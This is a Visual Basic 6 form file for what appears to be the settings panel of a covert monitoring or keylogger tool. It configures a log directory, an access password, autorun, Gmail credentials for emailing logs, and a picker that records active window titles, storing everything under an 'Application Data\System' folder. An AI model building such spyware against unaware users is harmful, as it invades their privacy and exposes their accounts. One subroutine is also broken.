VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   5145
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4920
   LinkTopic       =   "Form1"
   ScaleHeight     =   5145
   ScaleWidth      =   4920
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtUserName 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   1800
      Locked          =   -1  'True
      TabIndex        =   25
      Text            =   "PC04"
      Top             =   120
      Width           =   2055
   End
   Begin VB.CommandButton cmdLoadTitles 
      Caption         =   "Show Titles"
      Height          =   375
      Left            =   240
      TabIndex        =   24
      Top             =   4680
      Width           =   1695
   End
   Begin VB.CommandButton cmdsaveChanges 
      Caption         =   "Save"
      Height          =   375
      Left            =   2640
      TabIndex        =   23
      Top             =   4680
      Width           =   1575
   End
   Begin VB.Frame Frame3 
      Caption         =   "Titles Picker:"
      Height          =   3855
      Left            =   -120
      TabIndex        =   16
      Top             =   5040
      Width           =   5895
      Begin VB.CommandButton cmdSaveTitles 
         Caption         =   "Save Titles"
         Height          =   375
         Left            =   2040
         TabIndex        =   22
         Top             =   3360
         Width           =   1695
      End
      Begin VB.CommandButton cmdRemoveTitle 
         Caption         =   ">>"
         Height          =   375
         Left            =   2640
         TabIndex        =   21
         Top             =   2280
         Width           =   615
      End
      Begin VB.CommandButton cmdAddTitles 
         Caption         =   "<<"
         Height          =   375
         Left            =   2640
         TabIndex        =   20
         Top             =   1200
         Width           =   615
      End
      Begin VB.CommandButton cmdScanTitles 
         Caption         =   "Pick Titles"
         Height          =   375
         Left            =   4440
         TabIndex        =   19
         Top             =   3000
         Width           =   1095
      End
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   2280
         Top             =   840
      End
      Begin VB.ListBox List2 
         Height          =   2205
         ItemData        =   "Form1.frx":0000
         Left            =   3240
         List            =   "Form1.frx":0002
         MultiSelect     =   2  'Extended
         TabIndex        =   18
         Top             =   960
         Width           =   2535
      End
      Begin VB.ListBox List1 
         Height          =   2205
         Left            =   120
         TabIndex        =   17
         Top             =   960
         Width           =   2535
      End
      Begin VB.Image Image2 
         Height          =   375
         Left            =   5520
         Picture         =   "Form1.frx":0004
         Stretch         =   -1  'True
         Top             =   120
         Width           =   375
      End
      Begin VB.Image Image1 
         Height          =   375
         Left            =   5520
         Picture         =   "Form1.frx":03E1
         Stretch         =   -1  'True
         Top             =   120
         Width           =   420
      End
      Begin VB.Label Label12 
         Caption         =   $"Form1.frx":0819
         Height          =   615
         Left            =   120
         TabIndex        =   31
         Top             =   240
         Width           =   5535
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Frame2"
      Height          =   2175
      Left            =   120
      TabIndex        =   9
      Top             =   360
      Width           =   4335
      Begin VB.ComboBox Combo1 
         Height          =   315
         ItemData        =   "Form1.frx":08E4
         Left            =   1800
         List            =   "Form1.frx":08F4
         TabIndex        =   28
         Text            =   "Combo1"
         Top             =   1440
         Width           =   2295
      End
      Begin VB.TextBox txtLogPWD 
         Height          =   285
         Left            =   1800
         TabIndex        =   15
         Text            =   "Text6"
         Top             =   960
         Width           =   2295
      End
      Begin VB.TextBox txtLogDir 
         Height          =   285
         Left            =   1800
         TabIndex        =   14
         Text            =   "Text5"
         Top             =   600
         Width           =   2295
      End
      Begin VB.TextBox txtPCDec 
         Height          =   285
         Left            =   1800
         TabIndex        =   11
         Text            =   "Text4"
         Top             =   240
         Width           =   2295
      End
      Begin VB.Label Label10 
         Caption         =   "Autorun :"
         Height          =   255
         Left            =   240
         TabIndex        =   27
         Top             =   1440
         Width           =   1455
      End
      Begin VB.Label Label8 
         Caption         =   "Computer Description :"
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   240
         Width           =   1575
      End
      Begin VB.Label Label7 
         Caption         =   "Password to Open :"
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   960
         Width           =   1455
      End
      Begin VB.Label Label6 
         Caption         =   "Log Directory :"
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   600
         Width           =   1215
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Frame1"
      Height          =   1935
      Left            =   120
      TabIndex        =   0
      Top             =   2640
      Width           =   4335
      Begin VB.TextBox txtReTime 
         Height          =   285
         Left            =   2160
         TabIndex        =   30
         Text            =   "Text7"
         Top             =   1440
         Width           =   495
      End
      Begin VB.TextBox txtSePWD 
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   1560
         PasswordChar    =   "*"
         TabIndex        =   3
         Text            =   "Text1"
         Top             =   960
         Width           =   1695
      End
      Begin VB.TextBox txtSeEmail 
         Height          =   285
         Left            =   1560
         TabIndex        =   2
         Text            =   "Text2"
         Top             =   600
         Width           =   1695
      End
      Begin VB.TextBox txtRecEmail 
         Height          =   285
         Left            =   1560
         TabIndex        =   1
         Text            =   "Text3"
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label Label11 
         Caption         =   "If Sending failed, Retry after:             minutes."
         Height          =   255
         Left            =   120
         TabIndex        =   29
         Top             =   1440
         Width           =   3495
      End
      Begin VB.Label Label5 
         Caption         =   "@gmail.com"
         Height          =   255
         Left            =   3240
         TabIndex        =   8
         Top             =   240
         Width           =   975
      End
      Begin VB.Label Label1 
         Caption         =   "Email Sender :"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   600
         Width           =   1455
      End
      Begin VB.Label Label2 
         Caption         =   "Sender Password:"
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   960
         Width           =   1335
      End
      Begin VB.Label Label3 
         Caption         =   "@gmail.com"
         Height          =   255
         Left            =   3240
         TabIndex        =   5
         Top             =   600
         Width           =   975
      End
      Begin VB.Label Label4 
         Caption         =   "Email Recipient:"
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   240
         Width           =   1335
      End
   End
   Begin VB.Label Label9 
      Caption         =   "Welcome,"
      Height          =   255
      Left            =   120
      TabIndex        =   26
      Top             =   120
      Width           =   1455
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'active window title
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
' Returns the title of the active window.
' if GetParent = true then the parent window is
' returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hwnd As Long) As String
Dim l As Long
Dim s As String

l = GetWindowTextLength(hwnd)
s = Space(l + 1)

GetWindowText hwnd, s, l + 1

GetWindowTitle = Left$(s, l)
End Function
Private Sub GetPC()
Dim i As Long
Dim j As Long

i = GetForegroundWindow


Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j


GetActiveWindowTitle = GetWindowTitle(i)
End Sub



Private Sub cmdAddTitles_Click()
Timer1.Enabled = False
List2.Enabled = True

If List1.ListCount >= 5 Then MsgBox "Title Box Full!! Remove some Titles.", vbApplicationModal, "Adding Titles": Exit Sub

Dim i As Integer
For i = 0 To (List2.ListCount - 1)
    If (List2.Selected(i)) = True Then
    List2.ListIndex = i
    List1.AddItem (List2.Text)
    End If
Next i
End Sub


Private Sub cmdLoadTitles_Click()
If cmdLoadTitles.Caption = "Hide Titles" Then
cmdLoadTitles.Caption = "Show Titles"
Frame3.Visible = False
Exit Sub
End If

cmdLoadTitles.Cancel = True
cmdLoadTitles.Caption = "Hide Titles"
Frame3.Visible = True
Frame3.Top = 600
Frame3.Left = 100
List1.Clear
Dim t1, t2, t3, t4, t5 As String
Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\default.MCP" For Input As #1
Input #1, t1, t2, t3, t4, t5
Close #1
List1.AddItem t1
List1.AddItem t2
List1.AddItem t3
List1.AddItem t4
List1.AddItem t5
End Sub

Private Sub cmdRemoveTitle_Click()
If List1.ListIndex = -1 Then MsgBox "Choose Titles to Remove.", vbInformation: Exit Sub
List2.AddItem List1.Text, (List2.ListCount)
List1.RemoveItem (List1.ListIndex)
If List1.ListCount <> 0 Then List1.ListIndex = 0
End Sub

Private Sub cmdsaveChanges_Click()
Call SaveSetting
End Sub

Private Sub cmdSaveTitles_Click()

If List1.ListCount < 5 Then
For i = 1 To (5 - List1.ListCount)
List1.AddItem "No Title", (List1.ListCount)
Next
End If

Dim t1, t2, t3, t4, t5 As String
List1.ListIndex = 0
t1 = List1.Text
List1.ListIndex = 1
t2 = List1.Text
List1.ListIndex = 2
t3 = List1.Text
List1.ListIndex = 3
t4 = List1.Text
List1.ListIndex = 4
t5 = List1.Text

Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\default.MCP" For Output As #1
        Write #1, t1, t2, t3, t4, t5
Close #1
MsgBox "Titles Saved Successfully!!"
End Sub

Private Sub cmdScanTitles_Click()

If cmdScanTitles.Caption = "Stop Picking" Then
Timer1.Enabled = False
List2.Enabled = True
cmdScanTitles.Caption = "Start Picking"
Else
List2.Clear
Timer1.Enabled = True
List2.Enabled = False
cmdScanTitles.Caption = "Stop Picking"
Me.WindowState = 1
End If
End Sub



Private Sub Form_Load()
Call LoadSetting
End Sub
Private Sub LoadSetting()
Dim LogDir, LogPWD, RecEmail, SeEmail, SePWD, ReTime, PCDec As String
On Error GoTo errhand
Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt" For Input As #1
Input #1, LogDir, LogPWD, PCDec, RecEmail, SeEmail, SePWD, ReTime
Close #1
txtLogDir = LogDir
txtRecEmail = RecEmail
txtSeEmail = SeEmail
txtSePWD = SePWD
txtReTime = ReTime
txtPCDec = PCDec
txtLogPWD = LogPWD

errhand:
If Err.Number <> 0 Then MsgBox "Error while Loading!"
End Sub
Private Sub SaveSetting()
On Error GoTo errhand
Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt" For Output As #1
Write #1, txtLogDir, txtLogPWD, txtPCDec, txtRecEmail, txtSeEmail, txtSePWD, txtReTime
Close #1

errhand:
If Err.Number <> 0 Then
MsgBox "Error while saving!"
Else
MsgBox "Setting Saved!!", vbInformation
End If
End Sub

Private Sub Frame3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image2.Visible = True
End Sub

Private Sub Image1_Click()
Call cmdLoadTitles_Click
End Sub

Private Sub Image2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image2.Visible = False
End Sub

Private Sub Timer1_Timer()
Dim i As Integer
If List2.ListCount >= 10 Then Call cmdScanTitles_Click: Me.WindowState = 0

List2.ListIndex = List2.ListCount - 1

If GetActiveWindowTitle(True) = "" Or GetActiveWindowTitle(True) = Me.Caption Then Exit Sub

If List2.Text <> GetActiveWindowTitle(True) Then List2.AddItem GetActiveWindowTitle(True)

End Sub

